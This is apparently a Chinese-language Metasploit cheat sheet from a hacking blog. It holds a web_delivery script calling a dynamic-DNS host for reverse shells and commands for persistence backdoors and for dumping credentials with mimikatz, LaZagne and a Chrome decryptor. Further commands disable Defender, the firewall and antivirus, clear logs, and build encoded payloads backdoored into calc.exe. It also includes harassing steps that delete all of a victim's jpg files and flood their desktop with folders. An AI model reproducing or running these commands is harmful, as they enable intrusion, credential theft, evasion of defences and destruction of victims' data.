---
layout: default
---
# ![](../img/hj.jpg)MetaSploit


## ![](../img/github26.png)更新
apt-get update; apt-get install metasploit-framework
## ![](../img/github27.png)rc 脚本
```
msfconsole -r 7.rc`

msfconsole -r 7.rc内容：
use exploit/multi/script/web_delivery
set target 2
set payload windows/meterpreter/reverse_tcp
set srvhost china.vicp.la
set srvport 8070
set uripath /
set lhost china.vicp.la
set lport 8887
set AutoRunScript migrate -n explorer.exe
set ExitOnSession false  #可接受多个session
exploit -j
```
## ![](../img/github28.png)后渗透
```
后门
meterpreter中run persistence -A -L c:\\ -X -i 10  -p 443 -r 10.10.10.130

获得sysadmin,browser,chat,mail,wifi密码:上传laZagne到目标，之后输入shell命令，laZagne.exe -h,laZagne.exe all获得一堆东西

另一个后门
meterpreter中run metsvc -h 再操作
监听，exploit/multi/handler
windows/metsvc_bind_tcp
exploit

dump browser memory
在meterpreter中上传procdump.exe
在shell中tasklist看浏览器pid,然后procdump.exe -ma 2228(pid)
然后exit,meterpreter中下载生成的dmp文件

获得明文用mimikatz
load mimikatz ,help mimikatz,msv,kerberos

纯文本密码目标机运行mimikatz，回显也是在目标机的mimikatz的shell中
privilege::debug
sekurlsa::logonpasswords

过防火墙
shell
net stop windefend
netsh firewall set opmode disable

卸载杀毒
在shell中wmic product get name查看安装的软件，找杀毒软件
卸载它，wmic product where name ="AVG(杀毒软件名)" call uninstall /nointeractive


让对方播放YouTube
background,use post/multi/manage/play_youtube
set SESSION 1号码与之前相同
set vid xxxxx就是?v=后面的一堆
run

换对方桌面
background
use post/windows/manage/set_wallpaper
set bmp /root/aaa.bmp我的图片地址
set SESSION 1 同上
run
然后删掉所有对方jpg
sessions -i 1
shell
del c:\*.jpg /f /s /q
exit可从shell回到meterpreter
接下来在对方桌面无限造文件夹
先做一个bat,上传到对方桌面，然后用shell执行bat.bat内容为
@echo off
:loop
md %random%
go to loop

获取chrome密码
meterpreter
upload 'root/chrompassworddecryptor.exe' c:\
shell然后cd c:
chrompassworddecryptor.exe mi.txt
exit然后download mi.txt /root/

powershell后渗透
之后可以用导入任何powshell来后渗透，例如^import-module /视频/Empire-master/data/module_source/fun/Incoke-xxx.ps1 (ps1的用法leafpad打开就有example)
之后可以sleep这个session
^sleep 26/11/2016 11:47:59 SA表示定时唤醒(SA是因为靶机时间后有SA)
```
## ![](../img/github1.png)开发shellcode
#### show payloads
选择一个payload

info windows/x64/meterpreter/reverse_tcp 查看需要什么参数，为msfvenom做准备

#### msfvenom生成payload
```
有两个必须的选项：
-p ：payload
-f ：格式，有：
Executable formats
	asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection, vba, vba-exe, vba-psh, vbs, war
Transform formats
	bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl, pl, powershell, ps1, py, python, raw, rb, ruby, sh, vbapplication, vbscript
================================================================================
举例：
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.8 lport=4444 -f c -e x86/shikata_ga_nai -i 3 -o /tmp/my_payload

-e: 	编码方式，用msfvenom -l encoders查看
-i:		编码次数
-o:	导出路径
```
## ![](../img/github2.png)开发exploit模块
添加exploit：

去github,exploitdb,rapit7,1377等下载source，放到对应目录，重启服务器和msf,个别的需要下两个文件，

reload_all
## ![](../img/github3.png)常用命令
```

service apache2 start

service postgresql start

msfconsole启动

1.MSF终端命令

show exploit

列出metasploit框架中的所有渗透攻击模块。

show payloads

列出metasploit框架中的所有攻击载荷。

show auxiliary

列出metasploit框架中的所有辅助攻击模块。

search name

查找metasploit框架中的所有渗透攻击和其他模块。

info

展示出制定渗透攻击或模块的相关信息。

use name

装载一个渗透攻击或者模块。

LHOST

目标主机链接的IP地址。

RHOST

远程主机或者目标主机。

set function

设置特定的配置参数。

setg function

以全局方式设置特定的配置参数。

show options

列出某个渗透攻击或模块中所有的参数配置。

show targets

列出渗透攻击所支持的目标平台。

set target num

指定你所知道的目标的操作系统以及补丁版本类型。

set payload

指定想要使用的攻击载荷。

show advanced

列出所有高级配置选项。

set autorunscript migrate -f.

在渗透攻击完成后，将自动迁移到另一个进程。

check 检测目标是否对选定渗透攻击存在相应安全漏洞

exploit

执行渗透攻击或模块来攻击目标。

exploit -j

在计划任务下进行渗透攻击（攻击将在后台进行）

exploit -z

渗透攻击成功后不与会话进行交互。

exploit -e encoder

制定使用的攻击载荷编码方式

exploit -h

列出exploit命令的帮助信息。

sessions -l

列出可用的交互会话（在处理多个shell时使用）

sessions -l -v

列出所有可用的交互会话以及会话详细信息，例如：攻击系统时使用了哪个安全漏洞。

sessions -s script

在所有活跃的meterpreter会话中运行一个特定的meterpreter脚本。

sessions -K

杀死所有活跃的交互会话。

sessions -c cmd

在所有活跃的metaerpreter会话上执行一个命令。

sessions -u sessionID

升级一个普通的win32shell到meterpreter shell。

db_create name

创建一个数据库驱动攻击所要使用的数据库。

db_nmap

利用nmap并把所有扫描数据库存储到数据库中。

db_autopwn -h

展示出db_autopwn命令的帮助信息。

db_autopwn -p -r -e

对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。

db_destroy

删除当前数据库。

db_destroy user:password@host:port/database

使用高级选项来删除数据库。



2.metapreter命令

help

打开帮助

run scriptname

运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。

sysinfo

列出受控主机的系统信息。

ls

列出目标主机的文件和文件夹信息。

use priv

加载特权提升扩展模块，来扩展meterpreter库。

ps

显示所有运行进程以及关联的用户账户。

migrate PID

迁移到一个指定的进程ID

use incognito

加载inconito功能（用来盗取目标主机的令牌或是假冒用户）

list_tokens -u

列出目标主机用户组的可用令牌。

impersonate_token DOMAIN_NAME\\USERNAME

假冒目标主机上的可用令牌。

steal_token

盗窃给定进程的可用令牌并进行令牌假冒。

drop_token

停止假冒当前的令牌。

getsystem

通过各种攻击向量来提升到系统用户权限。

shell

以所有可用令牌来运行一个交互的shell。

execute -f cmd.exe -i

执行cmd.exe命令并进行交互。

execute -f cmd.exe -i -t

以所有可用令牌来执行cmd命令。

execute -f cmd.exe -i -H -t

以所有可用令牌来执行cmd命令并隐藏该进程。

rev2self

回到控制目标主机的初始用户账户下。

reg command

在目标主机注册表中进行交互，创建，删除和查询等操作。

setdesktop number

切换到另一个用户界面（该功能基于那些用户已登录）。

screenshot

对目标主机的屏幕进行截图。

upload file

向目标主机上传文件。

download file

从目标主机下载文件。

keyscan_dump存储目标主机上或许的键盘记录。

getprivs

尽可能多的获取目标主机上的特权。

uietl enable keyboard/mouse

接管目标主机的键盘和鼠标。

background

将你当前的meterpreter shell转为后台执行。

hashdump

导出目标主机中的口令哈希值。

use sniffer

加载嗅探模块。

sniffer_interfaces

列出目标主机所有开放的网络接口。

sniffer_dump interfaceID pcapname

在目标主机上启动嗅探。

sniffer_start interfaceID packet_buffer

在目标主机上针对特定范围的数据包缓冲区启动嗅探。

sniffer_stats interfaceID

获取正在实施嗅探网络接口的统计数据

sniffer_stop interfaceID

停止嗅探。

add_user username password -h ip

在远程目标主机上添加一个用户。

add_group_user “Domain Adimins”username -h ip

将用户添加到目标主机的域管理员组中。

clearev

清除目标主机上的日志记录。

timestomp

修改文件属性，例如修改文件的创建时间（反取证调差）。

reboot

重启目标主机。

3.MSFpayload命令

msfpayload -h

MSFpayload 的帮助信息。

msfpayload windows/meterpreter/bind_tcp O

列出所有可用的攻击载荷。

msfpayload windows/metarpreter/bind_tcp O.

列出所有windows/meterpreter/bind_tcp 下攻击载荷的配置项（任何攻击载荷都是可以配置的）。

msfpayload windows/metaerpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X>payload.exe

创建一个metarpreter的reverse_tcp 攻击载荷回连到192.168.1.5的443端口，将其保存为名为payload.exe的windows可执行程序。

msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R>payload.ray

与上面生成同样的攻击载荷，到导成原始格式的文件，该文件将在后面的MSFencode中使用。

msfpayload windows/meterpreter/bind_tcp LPORT=443 C>payload.c

与上面生成同样的攻击载荷，但导出成C格式的shellcode。

msfpayload windows/meterpreter/bind_tcp LPORT=443 J>payload.java

导出成以%u编码方式的javaScript语言字符串。



4.MSFencode命令

msfencode -h

列出MSFencode的帮助信息。

msfencode -l

列出所有可用的编码器。

msfencode -t（c，eif.exe，java，js_be，perl，raw，ruby，vba，vbs，loop-vbs，asp，war，macho）

显示编码缓冲区的格式。

msfencode -i payload.raw -o encoded_payload,exe -e x86/shikata_ga_nai -c 5 -t exe

使用 shikata_nai编码器对payload.raw文件进行5次编码，然后导出一个名为encoded_payload.exe的文件。

msfpayload windows/meterpreter/bind_tcp LPORT=443 R|msfencode -e x86/_countdown -c 5 -t raw|msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded_payload.exe

创建一个经过多种编码格式嵌套编码的攻击载荷。

msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c

创建一个纯字母 数字的shellcode，由ESI寄存器指向shellcode，以C语言格式输出。



5.MSFcli命令。

msfcli | grep exploit

仅列出渗透攻击模块。

msfcli | grep exploit/windows

仅列出与Windows相关的渗透攻击模块。

msfcli exploit/windows/smb/msf08_067_netapi PYALOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.142 E

对172.16.32.142 发起ms08_067_netapi渗透攻击，配置了bind_tcp攻击载荷，并绑定在443端口进行监听。



6.Metasploit高级忍术

msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R|msfencode -x calc.exe -k -o payload.exe -c x86/shikata_ga_nai -c 7 -t exe

创建一个反弹式的Meterpreter攻击载荷，回连到192.168.1.5 主机的443端口，使用calc.exe作为载荷后门程序，让载荷执行流一直运行在被攻击的应用程序中，最后生成以.shikata_ga_nai编码器编码后的攻击载荷可执行程序payload.exe。

msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R|msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe

创建一个反弹式的meterpreter攻击载荷，回连到192.168.1.5主机的443端口，使用calc.exe作为载荷后门程序，不让载荷执行流一直运行在被攻击的应用程序中，同时在攻击载荷执行后也不会再目标主机上弹出任何信息。这种配置非常有用，当你通过浏览器漏洞控制了远程主机，并不想让计算机程序打开呈现在目标用户面前，同样，最后生成用.shikata_ga_nai 编码的攻击载荷程序payload.exe。

msfpayload windows/meterpreter/bind_tcp LPORT=443 R|msfencode -0 payload.exe -e x86/shikata_ga_nai -c 7 exe & & msfcli multi/bandler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E

创建一个raw格式的bind_tcp模式Meterpreter攻击载荷，用shikata_ga_nai编码7次，输出以payload.exe命名的windows可执行程序文件，同时启用多路监听方式进行执行。



7.MSFvenom

利用MSFvenom，一个集成套件，来创建和编码你的攻击载荷。

msfvenom --payload

windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai LHOST=172.16.1.32 LPORT=443 > msf.exe

[*] x86/shikata_ga_nai succeeded with size 317(iteration=1)

root://opt/framework3/msf3#



这一行命令就可以创建一个攻击载荷并自动产生出可执行文件格式。



8.Meterpreter后渗透攻击阶段命令。

在Windows主机上使用metarpreter进行提权操作。

meterpreter>use priv

meterpreter>getsystem

从一个给定的进程ID中窃取一个域管理员组令牌，添加一个域账户，并把域账户添加到域管理员组中。



meterpreter>ps



meterpreter>steal_token 1784

meterpreter>shell

c:\windows\sysem32>user metasploit @password /ADD /DOMAIN

c:\windows\sysem32>net group "Domain Admins" metasploit /ADD /DOMAIN



从SAM数据库中导出密码的哈希值。

meterpreter>use  priv

meterpreter>getsystem

meterpreter>hashdump

提示：在widonws 2008中，如果getsystem命令和hashdump命令抛出异常情况时，你需要迁移到一个以SYSTEM系统权限运行的进程中。

自动迁移到一个独立进程。

meterpreter>run migrate



通过meterpreter的killav脚步来杀死目标主机运行的杀毒软件进程。

meterpreter>run kallav

针对一个特定的进程捕获目标主机上的键盘记录：

meterpreter>ps

meterpreter>migrate 1436

meterpreter>kayscan_start

meterpreter>kayscan_start

meterpreter>keyscan_dump

meterpreter>kayscan_stop

使用匿名方式来假冒管理员：

meterpreter>use incognito

meterpreter>list_tokens -u

meterpreter>use priv

meterpreter>getsystem

meterpreter>list_tokens -u

meterpreter>impersonate_token IHAZSECURITY\\Admininistrator

查看目标主机都采取了那些防范保护措施，列出帮助菜单，关闭防火墙以及其它我们发现的保护措施。

meterpreter>run getcountermeasure

meterpreter>run getcountermeasure -h

meterpreter>run getcountermeasure -d -k

识别被控制的主机是否是一台虚拟机。

meterpreter>run checkvm

在一个meterpreter会话界面中使用cmd shell。

meterpreter>shell

获取目标主机的图形界面（VNC）.

meterpreter>run vnc

使正在运行的meterpreter界面在后台运行。

meterpreter>background

绕过windows的用户账户控制（UAC）机制。

meterpreter>run post/windows/escalate/bypassuac

导出苹果OS-X系统的口令哈希值。

meterpreter>run post/osx/gather/hashdump

导出linux系统的口令哈希值。

meterpreter>run post/linux/gather/hashdump
```


__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./tools)
